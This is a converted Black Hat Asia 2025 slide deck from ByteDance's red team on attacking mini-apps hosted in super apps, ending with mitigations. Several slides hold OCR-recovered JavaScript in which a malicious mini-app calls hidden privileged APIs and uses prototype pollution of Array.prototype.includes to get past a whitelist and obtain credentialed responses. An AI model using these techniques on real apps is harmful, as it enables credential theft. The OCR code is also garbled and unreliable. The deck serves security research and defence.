---
title: "Mini-App But Great Impact New Ways to Compromise Mobile Apps"
speakers: ["Wei Wen", "Xiangyu Cao", "Jiangchunxi Hou", "Zixi Liao", "Yingyan Song", "Zhongcheng Li", "Yijie Zhao", "Bin Ma"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2025"
edition: "ASIA"
year: 2025
source_pdf: "Black Hat Asia 2025 Slides/Wei Wen & Xiangyu Cao & Jiangchunxi Hou & Zixi Liao & Yingyan Song & Zhongcheng Li & Yijie Zhao & Bin Ma_Mini-App But Great Impact New Ways to Compromise Mobile Apps.pdf"
pages: 26
sha256: "c08d7229adc1dab3895c58b2ff02f71e58b7f18617fcd45c92a47f3580545637"
text_chars: 9500
ocr_pages: 12
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:47:36Z"
---
# Mini-App But Great Impact New Ways to Compromise Mobile Apps

**Speakers:** Wei Wen, Xiangyu Cao, Jiangchunxi Hou, Zixi Liao, Yingyan Song, Zhongcheng Li, Yijie Zhao, Bin Ma  
**Conference:** Black Hat ASIA 2025  
**Source:** `Black Hat Asia 2025 Slides/Wei Wen & Xiangyu Cao & Jiangchunxi Hou & Zixi Liao & Yingyan Song & Zhongcheng Li & Yijie Zhao & Bin Ma_Mini-App But Great Impact New Ways to Compromise Mobile Apps.pdf` (26 pages)


## Slide 1

Mini-App But Great Impact: New Ways to Compromise Mobile Apps

IES Red Team of ByteDance

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat
ASIA 2025
APRIL 3-4, 2025
BRIEFINGS
Mini-App But Great Impact:
New Ways to Compromise Mobile Apps
IES Red Team of ByteDance
```

## Slide 2

- Security researchers and developers at IES Red Team of ByteDance

## About us

- Privacy and data protection researches involving Apps and Systems

- Security bug hunters including Mobile, Web and Cloud

- • Speakers at Black Hat USA/Europe/Aisa, Black Hat USA Arsenal

#BHAS   @BlackHatEvents

## Slide 3

1. Introduction of Mini-Apps

2. Risk Assessment

Outline

3. Further Exploit

4. Security Recommendations

5. Concolusion

#BHAS   @BlackHatEvents

## Slide 4

# 1. Introduction of Mini-Apps

#BHAS   @BlackHatEvents

## Slide 5

### Mini-Apps and Super Apps

##### **Mini-app**

- hybrid solution

- Web technologies

- Integrates with the capabilities of native apps.

##### **Super app**

- Native app

- Host and Support for Mini-apps

- Provide resources

#BHAS   @BlackHatEvents

## Slide 6

### Comparison Study

|**Feature**|**Mini-app**|**Web App (Chrome)**|**Native App (Android)**|
|---|---|---|---|
|Deployed|pacgake|Web resources|apk|
|Engine|WebView/Native
V8/JavaScriptCore|Blink/Gecko/WebKit
V8/JavaScriptCore|ART/Dalvik|
|Dependencies|Super app|Browser|Android OS|

#BHAS   @BlackHatEvents

## Slide 7

#### <u>File API:</u>

- x.saveFIle - x.openFIle

- x.downloadFile

- x...

#### <u>Network API:</u>

- x.request

- x.fetch

- x.upload

- x...

#### <u>Location API:</u>

- x.getLocation

- x.queryGPS

- x.updateLocation

- ...

#### <u>Media API:</u>

- x.openCamera

- x.openMicrophone

- x.accessAlbum

- x..

### API & Security Mechanism

Security

Permission Check

- Vertical

- Horizontal

### Sandbox

- Data Storage

- Code Execution

- Runtime Environment

#BHAS   @BlackHatEvents

## Slide 8

# 2. Risk Assessment

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
“black hat Ss FS
ASIA 2025 SS oe
2. Risk Assessment
```

## Slide 9

### Comparsion and Risk Assessment

||**Web App**|**Native  App**|**Mini-App**|
|---|---|---|---|
|Access Control|✓|✓|✓|
|Sandbox Storage|-|✓|**?**|
|Same-origin policy|✓|-|**?**|
|Process isolation|✓|✓|**?**|

#BHAS   @BlackHatEvents

## Slide 10

Risk Assessment

FileManager API Operation
readFileSync read
API for File Access
writeFileSync write
unzip write
Risk Vunl Super-Apps
Relative path in parameter 2/9
Risk for File Access 3/9
Symbolic link in parameter
Filename with relative path in zip  5/9
file

#BHAS   @BlackHatEvents

## Slide 11

File Manager Risk Detail

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifcuchat File Manager Risk Detail
ASIA 2025 @
OQ Mini-App Runtime
Super-App 7
: Malicious :
fos] [ce
L. ‘B | |
Ga 3 :
quick open
OG
Credential Leak
Remote Code
Execuation
#BHAS @bBlackHatEvents
```

## Slide 12

Risk Assessment

Network API Operation
request Http Request
API for
upload Http Request
Network
connectSocket WebSocket connect
sendSocketMessage WebSocket send
onSocketMessage WebSocket response
Risk Vuln Super-Apps
Risk for
request with credentials to 1st-party 1/9
Network
request with credentials to 3rd-party 8/9
full access to response data 9/9

~~#BHAS   @BlackHa~~ tEvents

## Slide 13

### Network Risk Detail

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bene Network Risk Detail
ASIA 2025 @
© Mini-App Runtime
ner
Super-App
container eanainer
: Malicious ; : _
— : MiniApp 2 <)> MiniApp
I
quick open
O38 XY
#BHAS @bBlackHatEvents
```

## Slide 14

# 3. Further Exploit

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
i i, IL / le
“plackhat
ASIA 2025
3. Further Exploit
```

## Slide 15

1.JSCore analysis: static analysis and dynamic debugging of JSCore code can find hidden APIs at key nodes of public API processing.

2.Super-App analysis: reverse analysis of the host application's processing code for the mini program API can also find hidden APIs.

### Hidden API

#BHAS   @BlackHatEvents

## Slide 16

###### Mini-App API

### Invoke Sample

###### Malicious Mini-App

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisakhat Invoke Sample
ASIA 2025 r
Mini-App API Malicious Mini-App
// invoke Hiden API
i : // undocumented, used by 1st-party Mini-App
data:{ getUserDatal: function(){
weather: null, x.HidenRequest (4
isRequesting: false url: "uri_for_user_data",
_ method: "GET",
: i success: (res)=>{
Page
onLoad: function(){
this.getWeatherData();
},
// invoke documented API
getWeatherData: function(){ getUserData2: function() {
: i // invoke hiden API from global privileged variables
x. request ({ // (undocumented, interact with native)
url: “uri_for_weather_data", globalThis. testval. cal Native ({
method: "GET", method: "nativeRequest",
success: (res)=>{ parms: {
// : H url: "xxx",
— withCredentials: true
); //ues
PH
}
#BHAS @bBlackHatEvents
```

## Slide 17

### Hidden API Exploit

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2025
Mini-App
arty
getWeatherData: function(){
[x. request ({
url: "“uri_for_weather_data",
method: "GET",
success: (res)=>{},
4);
},
1-st Party
getUserData1: function(){
x. HidenRequest ({ 1
url: "uri_for_user_data",
method: "GET",
success: (res)=>{},
});
},
Malicious
globalThis. testval.callNative({
Method: “nativeRequest",
parms: {
urls "xxx",
method: "GET",
withCredentials: true
}
/ fue
})
function request(args){
invokeMethod("request", args, False);
}
function HidenRequest (args) {
invokeMethod("'NativeRequest", args, True);
}
callNative
method: "nativeRequest", <
parms: {
urls hood,
method: "GET",
withCredentials: isInnerApp
},
@Javascriptinterface
public void sendRequest(String a, String b){
haus
if (withCredentials) <4
Hidden API Exploit
Framework
Super App
connection. setRequestProperty("Cookie", getSessionCookies());
/ [aoe
String response = readResponse(connection) ;
if (response != null)
String data = response.content;
sendResponseToJs(callid, data);
#BHAS @bBlackHatEvents
```

## Slide 18

### Prototype Pollution

#### 1.Whitelist bypass 2.Private API parameter hijacking 3.User credentials leakage

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bifakhat Prototype Pollution
ASIA 2025 @
1.Whitelist bypass
2.Private API parameter hijacking
3.User credentials leakage
#BHAS @bBlackHatEvents
```

## Slide 19

### Prototype Pollution Demo

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseichat Prototype Pollution Demo
ASIA 2025 e@
> Array.prototype.src_includes = Array.prototype. includes;
Array.prototype.includes = function(search, Index) {
(if(search=== "“aaa"){ |
return false; »
} \
return Array.prototype.src_includes.call(this, search, Index);
Ki \
« f (search, Index) { \
if(search=== "aaa"){
return false;
) |
}
> let whiteList = ({"aaa",) "bbb",
return in an search, Index);
MeEEC.’ |
‘ |
> whiteList. includes ("bbb")
< true
[> whiteList.includes("aaa") | /
« false ~
#BHAS @bBlackHatEvents
```

## Slide 20

Prototype Pollution in Mobile Security

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2025
Page({
data:{
userName: null,
isRequesting: false
},
onLoad: function(){
this. getUserData() ;
},
getUserData: function(){
Prototype Pollution in Mobile Security
Mini-App Framework
globalThis. testval={
callNative: function(method, parms) {
// wos
_>{if (private_api_list. includes (method) ) {|-
throw “API deny"; 7
}
var r=
d(method, parms); 3
return ol(r) ? r.then(function(t) {
Array.prototype.src_includes = Array.prototype. includes;
Array.prototype.includes = function(search, Index) {
if(search=== "nativeRequest") {
return false;
\
return open(e,t); —__...-""
_Pp[ople nds Jen
5,
invHandlers, function(e, t){
var r = Number(e);
n= o.get (ih);
};
(globalThis.testval.callNative({ |
method: "nativeRequest",
parms: {
urls "Xxx",
withCredentials:
i,
success: (res)=>{
const userName = res.data.userName;
this.setData({
userName:
true
userName,
3
},
fail: (err)=>{
console. log("get fail", err);
this.setData({isRequesting: false});
}
});
},
});
“return Array.prototype.src_includes.call(this, search,
Index) ; if (n) { *
e(r,t); \
yo : n(uc(t));
call success }
@JavascriptInterface Super App
public void sendRequest(String a,\ String b){
Theva a
{if (withCredentials) {
connection.setRequestProperty("Cookie", getSessionCookies());
}
Mavis
{String response = readResponse(connection) ;
if (response != null) {
String data = response.content;
sendResponseToJs(callId, data);
#BHAS @bBlackHatEvents
```

## Slide 21

# 4. Security Recommendations

#BHAS   @BlackHatEvents

## Slide 22

Security Suggestion
Vulnerability Mitigation
FileManager API Sandbox for file accessing
NetWork API Strict restrictions for domain
Hidden API Permission control for Privileged API
Prototype Pollution Runtime Protection such as object freeze
Others ？

#BHAS   @BlackHatEvents

## Slide 23

### Security Suggestion

• Sandbox Isolation

Create an independent operating environment for each Mini-Apps to ensure that they do not interfere with each other

• Permission Control

Strictly control the access authorization for Mini-Apps, including access rights to the file system, network, storage, and devices

• Runtime Security Control the OS runtime environment of Mini-Apps, including system resources such as memory, CPU, and GPU, to prevent malicious code from causing excessive consumption or damage of system resources

#BHAS   @BlackHatEvents

## Slide 24

# 5. Conclusion

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
4 A fz aS Ath 7 [77 \ bey _
a ay / y 4 oa <
”, = ——
p/ , 4a a
\ Uf . y, 7
" \ \ Sp ? i a.
ar \ \ fi / | f LP os
7 7 /,* i
= “ é > —_
[= Sj 9 . * a
, _ ~~ J °
yg Pe : — Ma - “ o
7
pbx hat
ASIA 2025
5. Conclusion
```

## Slide 25

### Conclusion

1. Comparison between Mini-Apps, Web Apps, and Native Apps

2. Risk Assessment: Vulnerabilities in File System and Network Management 3. In-Depth Analysis: Hidden APIs and Exposed Global Variables

4. Prototype Pollution: Transitioning from Web Security to Mobile Security

5. Security suggestions for Mini-Apps and Super-Apps

#BHAS   @BlackHatEvents

## Slide 26

# Thanks for Listening

#BHAS   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
- blsekhat:
ASIA 2025
APRIL 3-4, 2025
BRIEFINGS
Thanks for Listening
```
